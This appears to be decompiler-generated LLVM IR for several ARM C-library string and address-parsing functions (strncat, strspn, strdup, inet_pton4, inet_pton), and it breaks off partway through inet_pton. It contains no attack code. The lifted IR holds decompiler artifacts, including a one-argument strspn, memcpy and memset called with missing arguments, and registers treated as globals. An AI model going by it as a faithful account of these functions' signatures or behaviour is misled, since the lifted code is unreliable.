define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16380 = load i32, i32* @r4, align 4
  store i32 %v3_16380, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1638c

dec_label_pc_1638c:                               ; preds = %dec_label_pc_1638c, %entry
  %v0_1638c = phi i32 [ %v5_1638c, %dec_label_pc_1638c ], [ %tmp, %entry ]
  %v1_1638c = inttoptr i32 %v0_1638c to i8*
  %v2_1638c = load i8, i8* %v1_1638c, align 1
  %v3_1638c = zext i8 %v2_1638c to i32
  store i32 %v3_1638c, i32* @ip, align 4
  %v5_1638c = add i32 %v0_1638c, 1
  store i32 %v5_1638c, i32* %r3.global-to-local, align 4
  %v2_16390 = icmp eq i8 %v2_1638c, 0
  store i1 %v2_16390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16390, label %dec_label_pc_16398, label %dec_label_pc_1638c

dec_label_pc_16398:                               ; preds = %dec_label_pc_1638c
  %v0_16398 = load i32, i32* %r2.global-to-local, align 4
  %v7_16398 = icmp eq i32 %v0_16398, 3
  store i1 %v7_16398, i1* %cpsr_z.global-to-local, align 1
  %v1_1639c = add i32 %v0_1638c, -1
  store i32 %v1_1639c, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_16398, 4
  br i1 %tmp10, label %dec_label_pc_16430thread-pre-split, label %dec_label_pc_163a4

dec_label_pc_163a4:                               ; preds = %dec_label_pc_16398
  %v3_163a4 = udiv i32 %v0_16398, 4
  store i32 %v3_163a4, i32* %r0.global-to-local, align 4
  %v0_163a8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_163a8

dec_label_pc_163a8:                               ; preds = %dec_label_pc_16408, %dec_label_pc_163a4
  %v2_163b0 = phi i32 [ %v1_16400, %dec_label_pc_16408 ], [ %v1_1639c, %dec_label_pc_163a4 ]
  %v0_163a8 = phi i32 [ %v1_163fc, %dec_label_pc_16408 ], [ %v0_163a8.pre, %dec_label_pc_163a4 ]
  %v1_163a8 = inttoptr i32 %v0_163a8 to i8*
  %v2_163a8 = load i8, i8* %v1_163a8, align 1
  %v3_163a8 = zext i8 %v2_163a8 to i32
  store i32 %v3_163a8, i32* %r3.global-to-local, align 4
  %v2_163ac = icmp eq i8 %v2_163a8, 0
  store i1 %v2_163ac, i1* %cpsr_z.global-to-local, align 1
  %v3_163b0 = add i32 %v2_163b0, 1
  %v4_163b0 = inttoptr i32 %v3_163b0 to i8*
  store i8 %v2_163a8, i8* %v4_163b0, align 1
  %v0_163b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_163b4 = add i32 %v0_163b4, 1
  store i32 %v1_163b4, i32* @ip, align 4
  %v0_163b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_163b8, label %.loopexit, label %dec_label_pc_163bc

dec_label_pc_163bc:                               ; preds = %dec_label_pc_163a8
  %v0_163bc = load i32, i32* @r1, align 4
  %v1_163bc = add i32 %v0_163bc, 1
  %v2_163bc = inttoptr i32 %v1_163bc to i8*
  %v3_163bc = load i8, i8* %v2_163bc, align 1
  %v4_163bc = zext i8 %v3_163bc to i32
  store i32 %v4_163bc, i32* %r3.global-to-local, align 4
  %v2_163c0 = icmp eq i8 %v3_163bc, 0
  store i1 %v2_163c0, i1* %cpsr_z.global-to-local, align 1
  %v3_163c4 = add i32 %v0_163b4, 2
  %v4_163c4 = inttoptr i32 %v3_163c4 to i8*
  store i8 %v3_163bc, i8* %v4_163c4, align 1
  %v0_163c8 = load i32, i32* @r1, align 4
  %v1_163c8 = add i32 %v0_163c8, 1
  store i32 %v1_163c8, i32* %r1.global-to-local, align 4
  %v0_163cc = load i32, i32* @ip, align 4
  %v1_163cc = add i32 %v0_163cc, 1
  store i32 %v1_163cc, i32* @ip, align 4
  %v0_163d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_163d0, label %.loopexit, label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %dec_label_pc_163bc
  %v1_163d4 = add i32 %v0_163c8, 2
  %v2_163d4 = inttoptr i32 %v1_163d4 to i8*
  %v3_163d4 = load i8, i8* %v2_163d4, align 1
  %v4_163d4 = zext i8 %v3_163d4 to i32
  store i32 %v4_163d4, i32* %r3.global-to-local, align 4
  %v2_163d8 = icmp eq i8 %v3_163d4, 0
  store i1 %v2_163d8, i1* %cpsr_z.global-to-local, align 1
  %v3_163dc = add i32 %v0_163cc, 2
  %v4_163dc = inttoptr i32 %v3_163dc to i8*
  store i8 %v3_163d4, i8* %v4_163dc, align 1
  %v0_163e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_163e0 = add i32 %v0_163e0, 1
  store i32 %v1_163e0, i32* %r1.global-to-local, align 4
  %v0_163e4 = load i32, i32* @ip, align 4
  %v1_163e4 = add i32 %v0_163e4, 1
  store i32 %v1_163e4, i32* %lr.global-to-local, align 4
  %v0_163e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_163e8, label %.loopexit, label %dec_label_pc_163ec

dec_label_pc_163ec:                               ; preds = %dec_label_pc_163d4
  %v1_163ec = add i32 %v0_163e0, 2
  %v2_163ec = inttoptr i32 %v1_163ec to i8*
  %v3_163ec = load i8, i8* %v2_163ec, align 1
  %v4_163ec = zext i8 %v3_163ec to i32
  store i32 %v4_163ec, i32* @ip, align 4
  store i32 %v1_163ec, i32* %r3.global-to-local, align 4
  %v2_163f4 = icmp eq i8 %v3_163ec, 0
  store i1 %v2_163f4, i1* %cpsr_z.global-to-local, align 1
  %v3_163f8 = add i32 %v0_163e4, 2
  %v4_163f8 = inttoptr i32 %v3_163f8 to i8*
  store i8 %v3_163ec, i8* %v4_163f8, align 1
  %v0_163fc = load i32, i32* %r3.global-to-local, align 4
  %v1_163fc = add i32 %v0_163fc, 1
  store i32 %v1_163fc, i32* @r1, align 4
  %v0_16400 = load i32, i32* %lr.global-to-local, align 4
  %v1_16400 = add i32 %v0_16400, 1
  store i32 %v1_16400, i32* %lr.global-to-local, align 4
  %v0_16404 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16404, label %.loopexit, label %dec_label_pc_16408

dec_label_pc_16408:                               ; preds = %dec_label_pc_163ec
  %v0_16408 = load i32, i32* %r0.global-to-local, align 4
  %v1_16408 = add i32 %v0_16408, -1
  store i32 %v1_16408, i32* %r0.global-to-local, align 4
  %v7_16408 = icmp eq i32 %v0_16408, 1
  store i1 %v7_16408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16408, label %dec_label_pc_16410, label %dec_label_pc_163a8

dec_label_pc_16410:                               ; preds = %dec_label_pc_16408
  %v0_16410 = load i32, i32* %r2.global-to-local, align 4
  %v1_16410 = urem i32 %v0_16410, 4
  store i32 %v1_16410, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16430

dec_label_pc_16418:                               ; preds = %dec_label_pc_16430
  %v0_16418 = load i32, i32* @r1, align 4
  %v1_16418 = inttoptr i32 %v0_16418 to i8*
  %v2_16418 = load i8, i8* %v1_16418, align 1
  %v3_16418 = zext i8 %v2_16418 to i32
  store i32 %v3_16418, i32* @ip, align 4
  %v2_1641c = icmp eq i8 %v2_16418, 0
  store i1 %v2_1641c, i1* %cpsr_z.global-to-local, align 1
  %v1_16420 = add i32 %v1_1643c, -1
  store i32 %v1_16420, i32* %r2.global-to-local, align 4
  %v3_16424 = add i32 %v3_1643c, 1
  %v4_16424 = inttoptr i32 %v3_16424 to i8*
  store i8 %v2_16418, i8* %v4_16424, align 1
  %v5_16424 = load i32, i32* %lr.global-to-local, align 4
  %v6_16424 = add i32 %v5_16424, 1
  store i32 %v6_16424, i32* %lr.global-to-local, align 4
  %v0_16428 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16428, label %.loopexit, label %dec_label_pc_1642c

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16418
  %v0_1642c = load i32, i32* @r1, align 4
  %v1_1642c = add i32 %v0_1642c, 1
  store i32 %v1_1642c, i32* @r1, align 4
  %v0_16430.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16430thread-pre-split

dec_label_pc_16430thread-pre-split:               ; preds = %dec_label_pc_1642c, %dec_label_pc_16398
  %v2_164246 = phi i32 [ %v6_16424, %dec_label_pc_1642c ], [ %v1_1639c, %dec_label_pc_16398 ]
  %v0_16430.pr = phi i32 [ %v0_16430.pr.pre, %dec_label_pc_1642c ], [ %v0_16398, %dec_label_pc_16398 ]
  br label %dec_label_pc_16430

dec_label_pc_16430:                               ; preds = %dec_label_pc_16430thread-pre-split, %dec_label_pc_16410
  %v3_1643c = phi i32 [ %v2_164246, %dec_label_pc_16430thread-pre-split ], [ %v1_16400, %dec_label_pc_16410 ]
  %v1_1643c = phi i32 [ %v0_16430.pr, %dec_label_pc_16430thread-pre-split ], [ %v1_16410, %dec_label_pc_16410 ]
  %v2_16430 = icmp eq i32 %v1_1643c, 0
  store i1 %v2_16430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16430, label %dec_label_pc_16438, label %dec_label_pc_16418

dec_label_pc_16438:                               ; preds = %dec_label_pc_16430
  %v0_16438 = load i32, i32* @ip, align 4
  %v2_16438 = icmp eq i32 %v0_16438, 0
  store i1 %v2_16438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16438, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_16438
  %v4_1643c = add i32 %v3_1643c, 1
  %v5_1643c = inttoptr i32 %v4_1643c to i8*
  store i8 0, i8* %v5_1643c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_163ec, %dec_label_pc_163d4, %dec_label_pc_163bc, %dec_label_pc_163a8, %dec_label_pc_16418, %dec_label_pc_16438, %bb
  %v0_16440 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16440, i32* %r0.global-to-local, align 4
  %v2_16444 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16444, i32* @r4, align 4
  ret i32 %v0_16440

; uselistorder directives
  uselistorder i32 %v1_1643c, { 1, 0 }
  uselistorder i32 %v1_16410, { 1, 0 }
  uselistorder i32 %v0_16408, { 1, 0 }
  uselistorder i32 %v1_16400, { 0, 2, 1 }
  uselistorder i32 %v1_163fc, { 1, 0 }
  uselistorder i32 %v0_16398, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1638c, { 1, 0 }
  uselistorder i32 %v0_1638c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_164802 = load i32, i32* @r0, align 4
  %v1_164803 = inttoptr i32 %v0_164802 to i8*
  %v2_164804 = load i8, i8* %v1_164803, align 1
  %v3_164805 = zext i8 %v2_164804 to i32
  store i32 %v3_164805, i32* @r2, align 4
  %v2_164846 = icmp eq i8 %v2_164804, 0
  br i1 %v2_164846, label %dec_label_pc_16490, label %dec_label_pc_1645c.preheader

dec_label_pc_16454:                               ; preds = %dec_label_pc_1645c
  %v1_16464 = add i32 %v0_16464, 1
  %v9_16454 = icmp eq i32 %v0_16470, %v3_1645c
  br i1 %v9_16454, label %dec_label_pc_16470, label %dec_label_pc_1645c

dec_label_pc_1645c:                               ; preds = %dec_label_pc_1645c.preheader, %dec_label_pc_16454
  %v0_16464 = phi i32 [ %tmp, %dec_label_pc_1645c.preheader ], [ %v1_16464, %dec_label_pc_16454 ]
  %v1_1645c = inttoptr i32 %v0_16464 to i8*
  %v2_1645c = load i8, i8* %v1_1645c, align 1
  %v3_1645c = zext i8 %v2_1645c to i32
  store i32 %v3_1645c, i32* @ip, align 4
  %v2_16460 = icmp eq i8 %v2_1645c, 0
  br i1 %v2_16460, label %dec_label_pc_16490, label %dec_label_pc_16454

dec_label_pc_16470:                               ; preds = %dec_label_pc_16454
  %v2_16470 = icmp eq i32 %v0_16470, 0
  br i1 %v2_16470, label %dec_label_pc_16490, label %dec_label_pc_16478

dec_label_pc_16478:                               ; preds = %dec_label_pc_16470
  %v1_16478 = add i32 %v0_16478, 1
  store i32 %v1_16478, i32* @lr, align 4
  %v1_1647c = add i32 %v0_1647c, 1
  %v1_16480 = inttoptr i32 %v1_1647c to i8*
  %v2_16480 = load i8, i8* %v1_16480, align 1
  %v3_16480 = zext i8 %v2_16480 to i32
  store i32 %v3_16480, i32* @r2, align 4
  %v2_16484 = icmp eq i8 %v2_16480, 0
  br i1 %v2_16484, label %dec_label_pc_16490, label %dec_label_pc_1645c.preheader

dec_label_pc_1645c.preheader:                     ; preds = %entry, %dec_label_pc_16478
  %v0_1647c = phi i32 [ %v1_1647c, %dec_label_pc_16478 ], [ %v0_164802, %entry ]
  %v0_16478 = phi i32 [ %v1_16478, %dec_label_pc_16478 ], [ 0, %entry ]
  %v0_16470 = phi i32 [ %v3_16480, %dec_label_pc_16478 ], [ %v3_164805, %entry ]
  br label %dec_label_pc_1645c

dec_label_pc_16490:                               ; preds = %dec_label_pc_16470, %dec_label_pc_16478, %dec_label_pc_1645c, %entry
  %v0_16490 = phi i32 [ 0, %entry ], [ %v0_16478, %dec_label_pc_1645c ], [ %v1_16478, %dec_label_pc_16478 ], [ %v0_16478, %dec_label_pc_16470 ]
  ret i32 %v0_16490

; uselistorder directives
  uselistorder i32 %v3_1645c, { 1, 0 }
  uselistorder i32 %v0_16464, { 1, 0 }
  uselistorder label %dec_label_pc_16490, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1645c.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_16498 = load i32, i32* @r4, align 4
  store i32 %v3_16498, i32* %stack_var_-12, align 4
  %v6_16498 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_164a0 = call i32 @strlen(i8* %arg1)
  %v1_164a4 = add i32 %v3_164a0, 1
  store i32 %v1_164a4, i32* @r4, align 4
  %v1_164ac = call i32 @malloc(i32 %v1_164a4)
  store i32 91328, i32* @lr, align 4
  %v1_164bc = icmp ne i32 %v1_164ac, 0
  call void @__pseudo_cond_branch(i1 %v1_164bc, i32 ptrtoint (i32* @global_var_11770.828 to i32))
  %v2_164c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_164c4, i32* @r4, align 4
  store i32 %v6_16498, i32* @r5, align 4
  ret i32 %v1_164ac

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 9, 10, 11, 8, 15, 13, 14, 12, 6, 2, 3, 0, 7, 1, 5 }
  uselistorder i32 (i32)* @malloc, { 8, 5, 4, 14, 15, 7, 6, 13, 12, 11, 10, 9, 3, 2, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_164c8 = load i32, i32* @r5, align 4
  %v2_164d0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_164d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_165583 = load i8, i8* %arg1, align 1
  %v3_165584 = zext i8 %v2_165583 to i32
  store i32 %v3_165584, i32* @ip, align 4
  %v5_165585 = add i32 %tmp, 1
  store i32 %v5_165585, i32* @r4, align 4
  %v2_1655c6 = icmp eq i8 %v2_165583, 0
  store i1 %v2_1655c6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1655c6, label %dec_label_pc_16568, label %dec_label_pc_164f0

dec_label_pc_164f0:                               ; preds = %entry, %dec_label_pc_16558.backedge
  %v0_16534 = phi i32 [ %v3_16558, %dec_label_pc_16558.backedge ], [ %v3_165584, %entry ]
  %v1_1656010.in = phi i32 [ %v3_16558, %dec_label_pc_16558.backedge ], [ %v3_165584, %entry ]
  %v1_1656010 = add nsw i32 %v1_1656010.in, -48
  %v2_164f0 = icmp ugt i32 %v1_1656010, 8
  %v7_164f0 = icmp eq i32 %v1_1656010, 9
  store i1 %v7_164f0, i1* %cpsr_z.global-to-local, align 1
  %v2_164f8 = xor i1 %v7_164f0, true
  %v3_164f8 = and i1 %v2_164f0, %v2_164f8
  br i1 %v3_164f8, label %dec_label_pc_16534, label %dec_label_pc_164fc

dec_label_pc_164fc:                               ; preds = %dec_label_pc_164f0
  %v0_164fc = load i32, i32* %r0.global-to-local, align 4
  %v1_164fc = inttoptr i32 %v0_164fc to i8*
  %v2_164fc = load i8, i8* %v1_164fc, align 1
  %v3_164fc = zext i8 %v2_164fc to i32
  %v3_16504 = mul nuw nsw i32 %v3_164fc, 10
  %v4_16504 = add nuw nsw i32 %v3_16504, %v0_16534
  %v1_16508 = add nsw i32 %v4_16504, -48
  %v2_1650c = icmp ugt i32 %v1_16508, 254
  %v7_1650c = icmp eq i32 %v1_16508, 255
  store i1 %v7_1650c, i1* %cpsr_z.global-to-local, align 1
  %v2_16510 = xor i1 %v7_1650c, true
  %v3_16510 = and i1 %v2_1650c, %v2_16510
  br i1 %v3_16510, label %dec_label_pc_1658c, label %dec_label_pc_16514

dec_label_pc_16514:                               ; preds = %dec_label_pc_164fc
  %v0_16514 = load i32, i32* %r1.global-to-local, align 4
  %v2_16514 = icmp eq i32 %v0_16514, 0
  store i1 %v2_16514, i1* %cpsr_z.global-to-local, align 1
  %v1_16518 = trunc i32 %v1_16508 to i8
  store i8 %v1_16518, i8* %v1_164fc, align 1
  %v0_1651c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1651c, label %dec_label_pc_16520, label %dec_label_pc_16558.backedge

dec_label_pc_16520:                               ; preds = %dec_label_pc_16514
  %v0_16520 = load i32, i32* @lr, align 4
  %v1_16520 = add i32 %v0_16520, 1
  store i32 %v1_16520, i32* @lr, align 4
  %v7_16524 = icmp eq i32 %v1_16520, 4
  store i1 %v7_16524, i1* %cpsr_z.global-to-local, align 1
  %v0_16528 = load i32, i32* %r1.global-to-local, align 4
  %v1_16528 = add i32 %v0_16528, 1
  store i32 %v1_16528, i32* %r1.global-to-local, align 4
  %v8_1652c = icmp sgt i32 %v1_16520, 4
  br i1 %v8_1652c, label %dec_label_pc_1658c, label %dec_label_pc_16558.backedge

dec_label_pc_16534:                               ; preds = %dec_label_pc_164f0
  %v7_16534 = icmp eq i32 %v0_16534, 46
  store i1 %v7_16534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16534, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_16534
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1658c

bb:                                               ; preds = %dec_label_pc_16534
  %v1_1653c = load i32, i32* %r1.global-to-local, align 4
  %v2_1653c = urem i32 %v1_1653c, 2
  %v2_16540 = icmp eq i32 %v2_1653c, 0
  store i1 %v2_16540, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_16540, label %dec_label_pc_1658c, label %dec_label_pc_1654c

dec_label_pc_1654c:                               ; preds = %bb
  %v0_1654c = load i32, i32* @lr, align 4
  %v7_1654c = icmp eq i32 %v0_1654c, 4
  store i1 %v7_1654c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1654c, label %dec_label_pc_1658c, label %dec_label_pc_16554

dec_label_pc_16554:                               ; preds = %dec_label_pc_1654c
  %v2_16554 = load i32, i32* %r0.global-to-local, align 4
  %v3_16554 = add i32 %v2_16554, 1
  %v4_16554 = inttoptr i32 %v3_16554 to i8*
  store i8 0, i8* %v4_16554, align 1
  %v5_16554 = load i32, i32* %r0.global-to-local, align 4
  %v6_16554 = add i32 %v5_16554, 1
  store i32 %v6_16554, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16558.backedge

dec_label_pc_16558.backedge:                      ; preds = %dec_label_pc_16554, %dec_label_pc_16514, %dec_label_pc_16520
  %v0_16558 = load i32, i32* @r4, align 4
  %v1_16558 = inttoptr i32 %v0_16558 to i8*
  %v2_16558 = load i8, i8* %v1_16558, align 1
  %v3_16558 = zext i8 %v2_16558 to i32
  store i32 %v3_16558, i32* @ip, align 4
  %v5_16558 = add i32 %v0_16558, 1
  store i32 %v5_16558, i32* @r4, align 4
  %v2_1655c = icmp eq i8 %v2_16558, 0
  store i1 %v2_1655c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1655c, label %dec_label_pc_16558.dec_label_pc_16568_crit_edge, label %dec_label_pc_164f0

dec_label_pc_16558.dec_label_pc_16568_crit_edge:  ; preds = %dec_label_pc_16558.backedge
  %v0_16568.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_16568

dec_label_pc_16568:                               ; preds = %dec_label_pc_16558.dec_label_pc_16568_crit_edge, %entry
  %v0_16568 = phi i32 [ %v0_16568.pre, %dec_label_pc_16558.dec_label_pc_16568_crit_edge ], [ 0, %entry ]
  %v7_16568 = icmp eq i32 %v0_16568, 3
  store i1 %v7_16568, i1* %cpsr_z.global-to-local, align 1
  %v7_1656c = icmp slt i32 %v0_16568, 4
  br i1 %v7_1656c, label %dec_label_pc_1658c, label %dec_label_pc_16570

dec_label_pc_16570:                               ; preds = %dec_label_pc_16568
  %v0_16570 = load i32, i32* @r5, align 4
  store i32 %v0_16570, i32* @r0, align 4
  store i32 %v2_164d0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1657c = call i32 @memcpy()
  br label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %dec_label_pc_164fc, %dec_label_pc_16520, %bb, %dec_label_pc_1654c, %.thread12, %dec_label_pc_16568, %dec_label_pc_16570
  %storemerge = phi i32 [ 1, %dec_label_pc_16570 ], [ 0, %dec_label_pc_16568 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1654c ], [ 0, %bb ], [ 0, %dec_label_pc_16520 ], [ 0, %dec_label_pc_164fc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_164c8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_16568, { 1, 0 }
  uselistorder i32 %v3_16558, { 2, 1, 0 }
  uselistorder i32 %v0_16534, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 1, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_1658c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_16558.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_164f0, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_16594 = load i32, i32* @r4, align 4
  %v6_16594 = load i32, i32* @r5, align 4
  %v9_16594 = load i32, i32* @r6, align 4
  %v7_16598 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_16598, label %dec_label_pc_165b8, label %dec_label_pc_165ac

dec_label_pc_165ac:                               ; preds = %entry
  %v7_165ac = icmp eq i32 %arg1, 10
  br i1 %v7_165ac, label %dec_label_pc_165cc, label %dec_label_pc_1677c

dec_label_pc_165b8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_165c0 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_165c0, i32* %r0.global-to-local, align 4
  store i32 %v4_165c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16794

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165ac
  %v2_165cc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_165cc, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_165d8 = bitcast i32* %stack_var_-52 to i8*
  %v3_165d8 = call i32 @__GI_memset(i8* %v2_165d8, i32 0)
  store i32 %v3_165d8, i32* %r0.global-to-local, align 4
  %v0_165dc = load i32, i32* @r6, align 4
  %v1_165dc = inttoptr i32 %v0_165dc to i8*
  %v2_165dc = load i8, i8* %v1_165dc, align 1
  %v3_165dc = zext i8 %v2_165dc to i32
  store i32 %v3_165dc, i32* %r3.global-to-local, align 4
  %v7_165e0 = icmp eq i8 %v2_165dc, 58
  store i32 %v3_165d8, i32* @r4, align 4
  %v2_165e8 = add i32 %v3_165d8, 16
  store i32 %v2_165e8, i32* %r8.global-to-local, align 4
  br i1 %v7_165e0, label %dec_label_pc_165f0, label %dec_label_pc_165fc

dec_label_pc_165f0:                               ; preds = %dec_label_pc_165cc
  %v1_165f0 = add i32 %v0_165dc, 1
  %v2_165f0 = inttoptr i32 %v1_165f0 to i8*
  %v3_165f0 = load i8, i8* %v2_165f0, align 1
  %v4_165f0 = zext i8 %v3_165f0 to i32
  store i32 %v4_165f0, i32* %r3.global-to-local, align 4
  store i32 %v1_165f0, i32* @r6, align 4
  %v7_165f4 = icmp eq i8 %v3_165f0, 58
  br i1 %v7_165f4, label %dec_label_pc_165fc, label %dec_label_pc_16790

dec_label_pc_165fc:                               ; preds = %dec_label_pc_165f0, %dec_label_pc_165cc
  %v0_16600 = phi i32 [ %v1_165f0, %dec_label_pc_165f0 ], [ %v0_165dc, %dec_label_pc_165cc ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_16600, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_166dc7 = inttoptr i32 %v0_16600 to i8*
  %v2_166dc8 = load i8, i8* %v1_166dc7, align 1
  %v3_166dc9 = zext i8 %v2_166dc8 to i32
  store i32 %v3_166dc9, i32* %r0.global-to-local, align 4
  %v1_166e010 = call i32 @__GI_tolower(i32 %v3_166dc9)
  store i32 %v1_166e010, i32* %r0.global-to-local, align 4
  store i32 %v1_166e010, i32* @r5, align 4
  %v2_166e412 = icmp eq i32 %v1_166e010, 0
  br i1 %v2_166e412, label %dec_label_pc_166ec, label %dec_label_pc_16610

dec_label_pc_16610:                               ; preds = %dec_label_pc_165fc, %dec_label_pc_166dc.backedge
  %v0_16614 = phi i32 [ %v1_166e0, %dec_label_pc_166dc.backedge ], [ %v1_166e010, %dec_label_pc_165fc ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_166dc.backedge ], [ 0, %dec_label_pc_165fc ]
  store i32 ptrtoint ([17 x i8]* @global_var_1b0ac.920 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1b0ac.920 to i32), i32* %r0.global-to-local, align 4
  %v3_1661c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1b0ac.920 to i32), i32 %v0_16614)
  %v4_1661c = trunc i32 %v3_1661c to i8
  store i32 %v3_1661c, i32* %r0.global-to-local, align 4
  %v3_16620 = icmp eq i8 %v4_1661c, 0
  %v0_16624 = load i32, i32* @r6, align 4
  %v1_16624 = add i32 %v0_16624, 1
  store i32 %v1_16624, i32* @r6, align 4
  br i1 %v3_16620, label %dec_label_pc_16640, label %dec_label_pc_1662c

dec_label_pc_1662c:                               ; preds = %dec_label_pc_16610
  %v0_1662c = load i32, i32* %sb.global-to-local, align 4
  %v2_1662c = sext i8 %v4_1661c to i32
  %v3_1662c = sub i32 %v2_1662c, %v0_1662c
  store i32 %v3_1662c, i32* %r3.global-to-local, align 4
